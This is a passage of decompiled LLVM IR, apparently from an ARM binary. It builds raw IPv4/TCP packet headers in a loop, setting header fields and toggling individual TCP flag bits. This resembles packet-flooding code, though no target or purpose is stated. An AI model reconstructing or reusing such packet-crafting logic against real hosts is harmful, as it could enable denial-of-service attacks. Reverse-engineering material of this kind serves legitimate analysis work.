  %v2_b5bc = call i32 @llvm.bswap.i32(i32 %v3_b598)
  store i32 %v2_b5bc, i32* %r3.global-to-local, align 4
  %v2_b5c0 = add i32 %v2_b5b8, 4
  %v3_b5c0 = inttoptr i32 %v2_b5c0 to i32*
  store i32 %v2_b5bc, i32* %v3_b5c0, align 4
  %v0_b5c4 = load i32, i32* @r6, align 4
  %v1_b5c4 = add i32 %v0_b5c4, 8
  %v2_b5c4 = inttoptr i32 %v1_b5c4 to i32*
  %v3_b5c4 = load i32, i32* %v2_b5c4, align 4
  store i32 %v3_b5c4, i32* %r0.global-to-local, align 4
  %v1_b5cc = and i32 %v3_b5c4, 65280
  store i32 %v1_b5cc, i32* %r1.global-to-local, align 4
  %v3_b5d0 = mul i32 %v3_b5c4, 16777216
  %v4_b5d8 = mul nuw nsw i32 %v1_b5cc, 256
  %v5_b5d8 = or i32 %v4_b5d8, %v3_b5d0
  store i32 %v5_b5d8, i32* %r2.global-to-local, align 4
  %v2_b5e0 = call i32 @llvm.bswap.i32(i32 %v3_b5c4)
  store i32 %v2_b5e0, i32* %r3.global-to-local, align 4
  %v1_b5e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_b5e4 = add i32 %v1_b5e4, 8
  %v3_b5e4 = inttoptr i32 %v2_b5e4 to i32*
  store i32 %v2_b5e0, i32* %v3_b5e4, align 4
  %v0_b5e8 = load i32, i32* @r6, align 4
  %v1_b5e8 = inttoptr i32 %v0_b5e8 to i32*
  %v2_b5e8 = load i32, i32* %v1_b5e8, align 4
  %v3_b5ec = udiv i32 %v2_b5e8, 65536
  store i32 %v3_b5ec, i32* %r2.global-to-local, align 4
  %v3_b5f03 = udiv i32 %v2_b5e8, 16777216
  store i32 %v3_b5f03, i32* %r1.global-to-local, align 4
  %v0_b5f4 = load i32, i32* @r5, align 4
  %v3_b5f4 = sdiv i32 %v0_b5f4, 256
  store i32 %v3_b5f4, i32* %r3.global-to-local, align 4
  %v1_b5f8 = trunc i32 %v3_b5f4 to i8
  %v2_b5f8 = load i32, i32* %ip.global-to-local, align 4
  %v3_b5f8 = add i32 %v2_b5f8, 15
  %v4_b5f8 = inttoptr i32 %v3_b5f8 to i8*
  store i8 %v1_b5f8, i8* %v4_b5f8, align 1
  %v0_b5fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b5fc = trunc i32 %v0_b5fc to i8
  %v2_b5fc = load i32, i32* %ip.global-to-local, align 4
  %v3_b5fc = add i32 %v2_b5fc, 13
  %v4_b5fc = inttoptr i32 %v3_b5fc to i8*
  store i8 %v1_b5fc, i8* %v4_b5fc, align 1
  %v0_b600 = load i32, i32* %r2.global-to-local, align 4
  %v1_b600 = trunc i32 %v0_b600 to i8
  %v2_b600 = load i32, i32* %ip.global-to-local, align 4
  %v3_b600 = add i32 %v2_b600, 12
  %v4_b600 = inttoptr i32 %v3_b600 to i8*
  store i8 %v1_b600, i8* %v4_b600, align 1
  %v0_b604 = load i32, i32* @r5, align 4
  %v1_b604 = trunc i32 %v0_b604 to i8
  %v2_b604 = load i32, i32* %ip.global-to-local, align 4
  %v3_b604 = add i32 %v2_b604, 14
  %v4_b604 = inttoptr i32 %v3_b604 to i8*
  store i8 %v1_b604, i8* %v4_b604, align 1
  %v0_b608 = load i32, i32* @sl, align 4
  store i32 %v0_b608, i32* %r0.global-to-local, align 4
  %v1_b60c = call i32 @function_12578(i32 %v0_b608)
  store i32 %v1_b60c, i32* %r0.global-to-local, align 4
  store i32 %v2_b168, i32* %r1.global-to-local, align 4
  %v3_b614 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b614, i32* %r2.global-to-local, align 4
  %v2_b618 = load i32, i32* @r4, align 4
  %v5_b618 = mul i32 %v2_b618, 4
  %v6_b618 = add i32 %v5_b618, %v2_b168
  %v7_b618 = inttoptr i32 %v6_b618 to i32*
  store i32 %v1_b60c, i32* %v7_b618, align 4
  %v0_b61c = load i32, i32* %r1.global-to-local, align 4
  %v1_b61c = load i32, i32* %r2.global-to-local, align 4
  %v4_b61c = mul i32 %v1_b61c, 4
  %v5_b61c = add i32 %v4_b61c, %v0_b61c
  %v6_b61c = inttoptr i32 %v5_b61c to i32*
  %v7_b61c = load i32, i32* %v6_b61c, align 4
  store i32 %v7_b61c, i32* @r4, align 4
  %v1_b620 = inttoptr i32 %v7_b61c to i8*
  %v2_b620 = load i8, i8* %v1_b620, align 1
  %tmp100 = urem i8 %v2_b620, 16
  %v1_b624 = zext i8 %tmp100 to i32
  %v1_b628 = or i32 %v1_b624, 64
  store i32 %v1_b628, i32* %r3.global-to-local, align 4
  %v1_b62c = trunc i32 %v1_b628 to i8
  store i8 %v1_b62c, i8* %v1_b620, align 1
  %v0_b630 = load i32, i32* @r4, align 4
  %v1_b630 = inttoptr i32 %v0_b630 to i8*
  %v2_b630 = load i8, i8* %v1_b630, align 1
  store i32 %v3_b350, i32* %ip.global-to-local, align 4
  %v1_b63c = and i8 %v2_b630, -16
  %v1_b644 = or i8 %v1_b63c, 5
  store i32 %v5_b648, i32* %r0.global-to-local, align 4
  %v0_b64c = load i32, i32* @sl, align 4
  %v3_b64c = mul i32 %v0_b64c, 65536
  store i32 %v3_b64c, i32* %r2.global-to-local, align 4
  store i32 %v1_b1e8, i32* %lr.global-to-local, align 4
  store i8 %v1_b644, i8* %v1_b630, align 1
  store i32 %v4_b658, i32* %r1.global-to-local, align 4
  %v0_b65c = load i32, i32* %r2.global-to-local, align 4
  %v3_b65c = udiv i32 %v0_b65c, 65536
  %v1_b660 = urem i32 %v3_b65c, 256
  store i32 %v1_b660, i32* %r3.global-to-local, align 4
  %v3_b664 = udiv i32 %v0_b65c, 16777216
  store i32 %v3_b664, i32* %r2.global-to-local, align 4
  %v2_b668 = load i32, i32* @r4, align 4
  %v3_b668 = add i32 %v2_b668, 1
  %v4_b668 = inttoptr i32 %v3_b668 to i8*
  store i8 %v1_b668, i8* %v4_b668, align 1
  %v0_b66c = load i32, i32* %r2.global-to-local, align 4
  %v1_b66c = load i32, i32* %r3.global-to-local, align 4
  %v4_b66c = mul i32 %v1_b66c, 256
  %v5_b66c = or i32 %v4_b66c, %v0_b66c
  store i32 %v5_b66c, i32* %r2.global-to-local, align 4
  %v1_b670 = trunc i32 %v0_b66c to i8
  %v2_b670 = load i32, i32* @r4, align 4
  %v3_b670 = add i32 %v2_b670, 2
  %v4_b670 = inttoptr i32 %v3_b670 to i8*
  store i8 %v1_b670, i8* %v4_b670, align 1
  %v0_b674 = load i32, i32* %lr.global-to-local, align 4
  %v2_b674 = icmp eq i32 %v0_b674, 0
  store i1 %v2_b674, i1* %cpsr_z.global-to-local, align 1
  %v0_b678 = load i32, i32* %r2.global-to-local, align 4
  %v3_b678 = sdiv i32 %v0_b678, 256
  store i32 %v3_b678, i32* %r3.global-to-local, align 4
  store i32 %v4_b67c, i32* %r2.global-to-local, align 4
  %v1_b680 = trunc i32 %v3_b678 to i8
  %v2_b680 = load i32, i32* @r4, align 4
  %v3_b680 = add i32 %v2_b680, 3
  %v4_b680 = inttoptr i32 %v3_b680 to i8*
  store i8 %v1_b680, i8* %v4_b680, align 1
  %v0_b684 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b684, label %bb77, label %bb76

bb76:                                             ; preds = %dec_label_pc_b588
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %dec_label_pc_b588, %bb76
  %v0_b688 = load i32, i32* %r2.global-to-local, align 4
  %v1_b688 = trunc i32 %v0_b688 to i8
  %v2_b688 = load i32, i32* @r4, align 4
  %v3_b688 = add i32 %v2_b688, 8
  %v4_b688 = inttoptr i32 %v3_b688 to i8*
  store i8 %v1_b688, i8* %v4_b688, align 1
  %v0_b68c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b68c, label %.thread6, label %bb78

bb78:                                             ; preds = %bb77
  %v1_b68c = load i32, i32* %r3.global-to-local, align 4
  %v2_b68c = trunc i32 %v1_b68c to i8
  %v3_b68c = load i32, i32* @r4, align 4
  %v4_b68c = add i32 %v3_b68c, 6
  %v5_b68c = inttoptr i32 %v4_b68c to i8*
  store i8 %v2_b68c, i8* %v5_b68c, align 1
  %v0_b690.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b690.pr, label %.thread6, label %bb79

bb79:                                             ; preds = %bb78
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb77, %bb78, %bb79
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_b698 = load i32, i32* @r4, align 4
  %v3_b698 = add i32 %v2_b698, 9
  %v4_b698 = inttoptr i32 %v3_b698 to i8*
  store i8 6, i8* %v4_b698, align 1
  %v0_b69c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b69c, label %bb81, label %bb80

bb80:                                             ; preds = %.thread6
  %v1_b69c = load i32, i32* %r2.global-to-local, align 4
  %v2_b69c = trunc i32 %v1_b69c to i8
  %v3_b69c = load i32, i32* @r4, align 4
  %v4_b69c = add i32 %v3_b69c, 7
  %v5_b69c = inttoptr i32 %v4_b69c to i8*
  store i8 %v2_b69c, i8* %v5_b69c, align 1
  br label %bb81

bb81:                                             ; preds = %.thread6, %bb80
  %v2_b6a4 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_b6a4, i32* %r3.global-to-local, align 4
  %v0_b6a8 = load i32, i32* %r0.global-to-local, align 4
  %v3_b6a8 = sdiv i32 %v0_b6a8, 256
  store i32 %v3_b6a8, i32* %ip.global-to-local, align 4
  %v1_b6ac = load i32, i32* @r4, align 4
  %v2_b6ac = add i32 %v1_b6ac, 12
  %v3_b6ac = inttoptr i32 %v2_b6ac to i32*
  store i32 %v2_b6a4, i32* %v3_b6ac, align 4
  %v0_b6b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b6b0 = trunc i32 %v0_b6b0 to i8
  %v2_b6b0 = load i32, i32* @r4, align 4
  %v3_b6b0 = add i32 %v2_b6b0, 5
  %v4_b6b0 = inttoptr i32 %v3_b6b0 to i8*
  store i8 %v1_b6b0, i8* %v4_b6b0, align 1
  %v3_b6b4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b6b4, i32* %r2.global-to-local, align 4
  store i32 %v2_b158, i32* %ip.global-to-local, align 4
  %v4_b6bc = mul i32 %v3_b6b4, 16
  %v5_b6bc = add i32 %v4_b6bc, %v2_b158
  %v6_b6bc = inttoptr i32 %v5_b6bc to i32*
  %v7_b6bc = load i32, i32* %v6_b6bc, align 4
  store i32 %v7_b6bc, i32* %r3.global-to-local, align 4
  %v0_b6c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b6c0 = trunc i32 %v0_b6c0 to i8
  %v2_b6c0 = load i32, i32* @r4, align 4
  %v3_b6c0 = add i32 %v2_b6c0, 4
  %v4_b6c0 = inttoptr i32 %v3_b6c0 to i8*
  store i8 %v1_b6c0, i8* %v4_b6c0, align 1
  %v0_b6c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b6c4 = load i32, i32* @r4, align 4
  %v2_b6c4 = add i32 %v1_b6c4, 16
  %v3_b6c4 = inttoptr i32 %v2_b6c4 to i32*
  store i32 %v0_b6c4, i32* %v3_b6c4, align 4
  %v0_b6c8 = load i32, i32* %r2.global-to-local, align 4
  %v3_b6c8 = mul i32 %v0_b6c8, 16
  %v1_b6cc = load i32, i32* %ip.global-to-local, align 4
  %v2_b6cc = add i32 %v1_b6cc, %v3_b6c8
  store i32 %v2_b6cc, i32* %r2.global-to-local, align 4
  %v1_b6d0 = add i32 %v2_b6cc, 13
  %v2_b6d0 = inttoptr i32 %v1_b6d0 to i8*
  %v3_b6d0 = load i8, i8* %v2_b6d0, align 1
  %v4_b6d0 = zext i8 %v3_b6d0 to i32
  store i32 %v4_b6d0, i32* %r1.global-to-local, align 4
  %v1_b6d4 = add i32 %v2_b6cc, 12
  %v2_b6d4 = inttoptr i32 %v1_b6d4 to i8*
  %v3_b6d4 = load i8, i8* %v2_b6d4, align 1
  %v4_b6d4 = zext i8 %v3_b6d4 to i32
  %v4_b6d8 = mul nuw nsw i32 %v4_b6d0, 256
  %v5_b6d8 = or i32 %v4_b6d4, %v4_b6d8
  store i32 %v5_b6d8, i32* %r3.global-to-local, align 4
  %v2_b6dc = load i32, i32* @r4, align 4
  %v3_b6dc = add i32 %v2_b6dc, 20
  %v4_b6dc = inttoptr i32 %v3_b6dc to i8*
  store i8 %v3_b6d4, i8* %v4_b6dc, align 1
  %v0_b6e0 = load i32, i32* @r4, align 4
  %v1_b6e0 = add i32 %v0_b6e0, 20
  store i32 %v1_b6e0, i32* @r6, align 4
  %v0_b6e4 = load i32, i32* %r3.global-to-local, align 4
  %v3_b6e4 = sdiv i32 %v0_b6e4, 256
  store i32 %v3_b6e4, i32* %r3.global-to-local, align 4
  %v1_b6e8 = trunc i32 %v3_b6e4 to i8
  %v3_b6e8 = add i32 %v0_b6e0, 21
  %v4_b6e8 = inttoptr i32 %v3_b6e8 to i8*
  store i8 %v1_b6e8, i8* %v4_b6e8, align 1
  %v0_b6ec = load i32, i32* @r6, align 4
  %v1_b6ec = add i32 %v0_b6ec, 13
  %v2_b6ec = inttoptr i32 %v1_b6ec to i8*
  %v3_b6ec = load i8, i8* %v2_b6ec, align 1
  %v4_b6ec = zext i8 %v3_b6ec to i32
  store i32 %v4_b6ec, i32* %r3.global-to-local, align 4
  %v0_b6f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b6f0 = add i32 %v0_b6f0, 8
  %v2_b6f0 = inttoptr i32 %v1_b6f0 to i32*
  %v3_b6f0 = load i32, i32* %v2_b6f0, align 4
  store i32 %v3_b6f0, i32* %r1.global-to-local, align 4
  %v1_b6f4 = or i32 %v4_b6ec, 1
  store i32 %v1_b6f4, i32* %r3.global-to-local, align 4
  %v1_b6f8 = add i32 %v0_b6f0, 15
  %v2_b6f8 = inttoptr i32 %v1_b6f8 to i8*
  %v3_b6f8 = load i8, i8* %v2_b6f8, align 1
  %v4_b6f8 = zext i8 %v3_b6f8 to i32
  store i32 %v4_b6f8, i32* %ip.global-to-local, align 4
  %v1_b6fc = add i32 %v0_b6f0, 14
  %v2_b6fc = inttoptr i32 %v1_b6fc to i8*
  %v3_b6fc = load i8, i8* %v2_b6fc, align 1
  %v4_b6fc = zext i8 %v3_b6fc to i32
  store i32 %v4_b6fc, i32* %r0.global-to-local, align 4
  %v2_b700 = add i32 %v0_b6ec, 4
  %v3_b700 = inttoptr i32 %v2_b700 to i32*
  store i32 %v3_b6f0, i32* %v3_b700, align 4
  %v0_b704 = load i32, i32* %r2.global-to-local, align 4
  %v1_b704 = add i32 %v0_b704, 4
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* %lr.global-to-local, align 4
  %v0_b708 = load i32, i32* %r3.global-to-local, align 4
  %v1_b708 = trunc i32 %v0_b708 to i8
  %v2_b708 = load i32, i32* @r6, align 4
  %v3_b708 = add i32 %v2_b708, 13
  %v4_b708 = inttoptr i32 %v3_b708 to i8*
  store i8 %v1_b708, i8* %v4_b708, align 1
  %v0_b70c = load i32, i32* @r6, align 4
  %v1_b70c = add i32 %v0_b70c, 12
  %v2_b70c = inttoptr i32 %v1_b70c to i8*
  %v3_b70c = load i8, i8* %v2_b70c, align 1
  %v4_b70c = zext i8 %v3_b70c to i32
  store i32 %v4_b70c, i32* %r2.global-to-local, align 4
  %v1_b710 = add i32 %v0_b70c, 13
  %v2_b710 = inttoptr i32 %v1_b710 to i8*
  %v3_b710 = load i8, i8* %v2_b710, align 1
  %v4_b710 = zext i8 %v3_b710 to i32
  %v0_b714 = load i32, i32* %r0.global-to-local, align 4
  %v1_b714 = load i32, i32* %ip.global-to-local, align 4
  %v4_b714 = mul i32 %v1_b714, 256
  %v5_b714 = or i32 %v4_b714, %v0_b714
  store i32 %v5_b714, i32* %r0.global-to-local, align 4
  %tmp101 = urem i8 %v3_b70c, 16
  %v1_b718 = zext i8 %tmp101 to i32
  %v3_b71c = sdiv i32 %v5_b714, 256
  store i32 %v3_b71c, i32* %r1.global-to-local, align 4
  %v1_b720 = or i32 %v1_b718, 128
  store i32 %v1_b720, i32* %r2.global-to-local, align 4
  %v1_b724 = or i32 %v4_b710, 16
  store i32 %v1_b724, i32* %r3.global-to-local, align 4
  %v1_b728 = trunc i32 %v3_b71c to i8
  %v3_b728 = add i32 %v0_b70c, 3
  %v4_b728 = inttoptr i32 %v3_b728 to i8*
  store i8 %v1_b728, i8* %v4_b728, align 1
  %v0_b72c = load i32, i32* %lr.global-to-local, align 4
  %v1_b72c = load i32, i32* @r6, align 4
  %v2_b72c = add i32 %v1_b72c, 8
  %v3_b72c = inttoptr i32 %v2_b72c to i32*
  store i32 %v0_b72c, i32* %v3_b72c, align 4
  %v0_b730 = load i32, i32* %r2.global-to-local, align 4
  %v1_b730 = trunc i32 %v0_b730 to i8
  %v2_b730 = load i32, i32* @r6, align 4
  %v3_b730 = add i32 %v2_b730, 12
  %v4_b730 = inttoptr i32 %v3_b730 to i8*
  store i8 %v1_b730, i8* %v4_b730, align 1
  %v0_b734 = load i32, i32* %r3.global-to-local, align 4
  %v1_b734 = trunc i32 %v0_b734 to i8
  %v2_b734 = load i32, i32* @r6, align 4
  %v3_b734 = add i32 %v2_b734, 13
  %v4_b734 = inttoptr i32 %v3_b734 to i8*
  store i8 %v1_b734, i8* %v4_b734, align 1
  %v0_b738 = load i32, i32* %r0.global-to-local, align 4
  %v1_b738 = trunc i32 %v0_b738 to i8
  %v2_b738 = load i32, i32* @r6, align 4
  %v3_b738 = add i32 %v2_b738, 2
  %v4_b738 = inttoptr i32 %v3_b738 to i8*
  store i8 %v1_b738, i8* %v4_b738, align 1
  %v0_b73c = call i32 @function_e978()
  %v1_b73c = trunc i32 %v0_b73c to i8
  store i32 %v0_b73c, i32* %r0.global-to-local, align 4
  store i32 %v1_b220, i32* %lr.global-to-local, align 4
  %v0_b744 = load i32, i32* @r6, align 4
  %v1_b744 = add i32 %v0_b744, 13
  %v2_b744 = inttoptr i32 %v1_b744 to i8*
  %v3_b744 = load i8, i8* %v2_b744, align 1
  %v4_b744 = zext i8 %v3_b744 to i32
  store i32 %v1_b748, i32* %r2.global-to-local, align 4
  %v1_b74c = and i32 %v4_b744, 223
  %v5_b750 = or i32 %v1_b74c, %v4_b750
  store i32 %v5_b750, i32* %r3.global-to-local, align 4
  %v1_b754 = trunc i32 %v5_b750 to i8
  store i8 %v1_b754, i8* %v2_b744, align 1
  store i32 %v1_b240, i32* %r1.global-to-local, align 4
  %v0_b75c = load i32, i32* @r6, align 4
  %v1_b75c = add i32 %v0_b75c, 13
  %v2_b75c = inttoptr i32 %v1_b75c to i8*
  %v3_b75c = load i8, i8* %v2_b75c, align 1
  %v4_b75c = zext i8 %v3_b75c to i32
  store i32 %v1_b760, i32* %r3.global-to-local, align 4
  %v1_b764 = and i32 %v4_b75c, 239
  %v5_b768 = or i32 %v1_b764, %v4_b768
  store i32 %v5_b768, i32* %r2.global-to-local, align 4
  %v1_b76c = trunc i32 %v5_b768 to i8
  store i8 %v1_b76c, i8* %v2_b75c, align 1
  store i32 %v1_b260, i32* %ip.global-to-local, align 4
  %v0_b774 = load i32, i32* @r6, align 4
  %v1_b774 = add i32 %v0_b774, 13
  %v2_b774 = inttoptr i32 %v1_b774 to i8*
  %v3_b774 = load i8, i8* %v2_b774, align 1
  %v4_b774 = zext i8 %v3_b774 to i32
  store i32 %v1_b778, i32* %r2.global-to-local, align 4
  %v1_b77c = and i32 %v4_b774, 247
  %v5_b780 = or i32 %v1_b77c, %v4_b780
  store i32 %v5_b780, i32* %r3.global-to-local, align 4
  %v1_b784 = trunc i32 %v5_b780 to i8
  store i8 %v1_b784, i8* %v2_b774, align 1
  %v0_b78c = load i32, i32* @r6, align 4
  %v1_b78c = add i32 %v0_b78c, 13
  %v2_b78c = inttoptr i32 %v1_b78c to i8*
  %v3_b78c = load i8, i8* %v2_b78c, align 1
  %v4_b78c = zext i8 %v3_b78c to i32
  store i32 %v1_b790, i32* %r3.global-to-local, align 4
  %v1_b794 = and i32 %v4_b78c, 251
  %v5_b798 = or i32 %v1_b794, %v4_b798
  store i32 %v5_b798, i32* %r2.global-to-local, align 4
  %v1_b79c = trunc i32 %v5_b798 to i8
  store i8 %v1_b79c, i8* %v2_b78c, align 1
  store i32 %v1_b2a0, i32* %r1.global-to-local, align 4
  %v0_b7a4 = load i32, i32* @r6, align 4
  %v1_b7a4 = add i32 %v0_b7a4, 13
  %v2_b7a4 = inttoptr i32 %v1_b7a4 to i8*
  %v3_b7a4 = load i8, i8* %v2_b7a4, align 1
  %v4_b7a4 = zext i8 %v3_b7a4 to i32
  store i32 %v1_b7a8, i32* %r2.global-to-local, align 4
  %v1_b7ac = and i32 %v4_b7a4, 253
  %v4_b7b0 = or i32 %v1_b7ac, %v3_b7b0
  store i32 %v4_b7b0, i32* %r3.global-to-local, align 4
  %v1_b7b4 = trunc i32 %v4_b7b0 to i8
  store i8 %v1_b7b4, i8* %v2_b7a4, align 1
  %v0_b7b8 = load i32, i32* @r6, align 4
  %v1_b7b8 = add i32 %v0_b7b8, 13
  %v2_b7b8 = inttoptr i32 %v1_b7b8 to i8*
  %v3_b7b8 = load i8, i8* %v2_b7b8, align 1
  %v4_b7b8 = zext i8 %v3_b7b8 to i32
  %v0_b7bc = load i32, i32* @r8, align 4
  %v1_b7bc = urem i32 %v0_b7bc, 2
  %v1_b7c0 = and i32 %v4_b7b8, 254
  store i32 %v1_b7c0, i32* %r2.global-to-local, align 4
  %v4_b7c427 = udiv i32 %v0_b73c, 256
  %v2_b7c8 = or i32 %v1_b7c0, %v1_b7bc
  store i32 %v2_b7c8, i32* %r3.global-to-local, align 4
  %v1_b7cc = trunc i32 %v4_b7c427 to i8
  %v3_b7cc = add i32 %v0_b7b8, 15
  %v4_b7cc = inttoptr i32 %v3_b7cc to i8*
  store i8 %v1_b7cc, i8* %v4_b7cc, align 1
  %v3_b7d0 = load i32, i32* @r6, align 4
  %v4_b7d0 = add i32 %v3_b7d0, 14
  %v5_b7d0 = inttoptr i32 %v4_b7d0 to i8*
  store i8 %v1_b73c, i8* %v5_b7d0, align 1
  %v0_b7d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7d4 = trunc i32 %v0_b7d4 to i8
  %v2_b7d4 = load i32, i32* @r6, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 13
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i8*
  store i8 %v1_b7d4, i8* %v4_b7d4, align 1
  %v0_b7d8 = load i32, i32* @r4, align 4
  %v1_b7d8 = add i32 %v0_b7d8, 40
  store i32 %v1_b7d8, i32* %r0.global-to-local, align 4
  %v0_b7dc = load i32, i32* @sb, align 4
  store i32 %v0_b7dc, i32* @r1, align 4
  %v1_b7e0 = inttoptr i32 %v1_b7d8 to i8*
  %v2_b7e0 = call i32 @function_eaf8(i8* %v1_b7e0)
  store i32 %v2_b7e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7e4

dec_label_pc_b7e4:                                ; preds = %dec_label_pc_b384, %bb81
  %v3_b7e4 = load i32, i32* %stack_var_-40, align 4
  %v1_b7e8 = add i32 %v3_b7e4, 1
  store i32 %v1_b7e8, i32* %r3.global-to-local, align 4
  %v1_b7ec = load i32, i32* @fp, align 4
  %v9_b7ec = icmp eq i32 %v1_b7e8, %v1_b7ec
  store i1 %v9_b7ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b7e8, i32* %stack_var_-40, align 4
  %v5_b7f4 = icmp slt i32 %v1_b7e8, %v1_b7ec
  br i1 %v5_b7f4, label %dec_label_pc_b374, label %dec_label_pc_b7f8

dec_label_pc_b7f8:                                ; preds = %dec_label_pc_b7e4, %.thread18
  %v0_b80012 = phi i32 [ %v0_b348, %.thread18 ], [ %v1_b7ec, %dec_label_pc_b7e4 ]
  %v0_b7f8 = load i32, i32* @sb, align 4
  %v1_b7f8 = add i32 %v0_b7f8, 40
  store i32 %v1_b7f8, i32* @sl, align 4
  %v1_b7fc = add i32 %v0_b7f8, 20
  store i32 %v1_b7fc, i32* @r7, align 4
  %v2_b84c = icmp eq i32 %v1_b2f8, 0
  %v6_b82c = inttoptr i32 %v2_b168 to i32*
  %v3_b834 = icmp eq i32 %v3_b350, 65535
  br label %dec_label_pc_b800

dec_label_pc_b800:                                ; preds = %dec_label_pc_b85c, %dec_label_pc_b7f8
  %v0_b800 = phi i32 [ %v1_b93c, %dec_label_pc_b85c ], [ %v0_b80012, %dec_label_pc_b7f8 ]
  %v2_b800 = icmp eq i32 %v0_b800, 0
  store i1 %v2_b800, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp82 = icmp slt i32 %v0_b800, 1
  br label %dec_label_pc_b808

dec_label_pc_b808:                                ; preds = %dec_label_pc_b808, %dec_label_pc_b800
  br i1 %tmp82, label %dec_label_pc_b808, label %dec_label_pc_b80c

dec_label_pc_b80c:                                ; preds = %dec_label_pc_b808
  %v0_b80c = load i32, i32* @r7, align 4
  %tmp83 = mul i32 %v0_b80c, 256
  %v1_b814 = and i32 %tmp83, 65280
  %tmp84 = udiv i32 %v0_b80c, 256
  %v4_b818 = urem i32 %tmp84, 256
  %v5_b818 = or i32 %v4_b818, %v1_b814
  store i32 %v5_b818, i32* @r8, align 4
  store i32 %v2_b168, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b350, i32* %ip.global-to-local, align 4
  %v7_b82c = load i32, i32* %v6_b82c, align 4
  store i32 %v7_b82c, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b834, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_b840 = add i32 %v7_b82c, 20
  store i32 %v1_b840, i32* @r5, align 4
  br i1 %v3_b834, label %dec_label_pc_b968, label %dec_label_pc_b848

dec_label_pc_b848:                                ; preds = %dec_label_pc_b948, %dec_label_pc_b80c
  %v0_b850 = phi i32 [ %v7_b954, %dec_label_pc_b948 ], [ %v7_b82c, %dec_label_pc_b80c ]
  store i32 %v1_b2f8, i32* %lr.global-to-local, align 4
  store i1 %v2_b84c, i1* %cpsr_z.global-to-local, align 1
  %v1_b850 = add i32 %v0_b850, 40
  store i32 %v1_b850, i32* %r0.global-to-local, align 4
  %v0_b854 = load i32, i32* @sb, align 4
  store i32 %v0_b854, i32* @r1, align 4
  br i1 %v2_b84c, label %dec_label_pc_b85c, label %dec_label_pc_b98c

dec_label_pc_b85c:                                ; preds = %dec_label_pc_b848, %dec_label_pc_b968, %dec_label_pc_b98c
  %v2_b85c = phi i32 [ %v0_b850, %dec_label_pc_b848 ], [ %v0_b980, %dec_label_pc_b968 ], [ %v2_b85c.pre, %dec_label_pc_b98c ]
  %v0_b85c = load i32, i32* @r6, align 4
  %v1_b85c = trunc i32 %v0_b85c to i8
  %v3_b85c = add i32 %v2_b85c, 10
  %v4_b85c = inttoptr i32 %v3_b85c to i8*
  store i8 %v1_b85c, i8* %v4_b85c, align 1
  %v0_b860 = load i32, i32* @r6, align 4
  %v1_b860 = trunc i32 %v0_b860 to i8
  %v2_b860 = load i32, i32* @r4, align 4
  %v3_b860 = add i32 %v2_b860, 11
  %v4_b860 = inttoptr i32 %v3_b860 to i8*
  store i8 %v1_b860, i8* %v4_b860, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b868 = load i32, i32* @r4, align 4
  store i32 %v0_b868, i32* @r0, align 4
  %v2_b86c = call i32 @function_d0b8(i32 %v0_b868, i32 20)
  %v3_b86c = trunc i32 %v2_b86c to i8
  store i32 %v2_b86c, i32* %r0.global-to-local, align 4
  %v3_b870 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_b158, i32* %r2.global-to-local, align 4
  %v3_b878 = mul i32 %v3_b870, 16
  %v2_b87c = add i32 %v3_b878, %v2_b158
  store i32 %v2_b87c, i32* %r1.global-to-local, align 4
  %v1_b880 = add i32 %v2_b87c, 4
  %v2_b880 = inttoptr i32 %v1_b880 to i32*
  %v3_b880 = load i32, i32* %v2_b880, align 4
  %v3_b884 = mul i32 %v3_b880, 65536
  store i32 %v3_b884, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b880, 256
  %v1_b88c = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b880, 256
  %v4_b890 = urem i32 %tmp86, 256
  %v5_b890 = or i32 %v4_b890, %v1_b88c
  store i32 %v5_b890, i32* %r2.global-to-local, align 4
  %v1_b894 = add i32 %v3_b880, 1
  store i32 %v1_b894, i32* %r3.global-to-local, align 4
  store i32 %v1_b894, i32* %v2_b880, align 4
  %v0_b89c = load i32, i32* %r2.global-to-local, align 4
  %v1_b89c = load i32, i32* @r5, align 4
  %v2_b89c = add i32 %v1_b89c, 4
  %v3_b89c = inttoptr i32 %v2_b89c to i32*
  store i32 %v0_b89c, i32* %v3_b89c, align 4
  %v0_b8a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 8
  %v2_b8a0 = inttoptr i32 %v1_b8a0 to i32*
  %v3_b8a0 = load i32, i32* %v2_b8a0, align 4
  %tmp87 = mul i32 %v3_b8a0, 256
  %v1_b8ac = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b8a0, 256
  %v4_b8b0 = urem i32 %tmp88, 256
  %v5_b8b0 = or i32 %v4_b8b0, %v1_b8ac
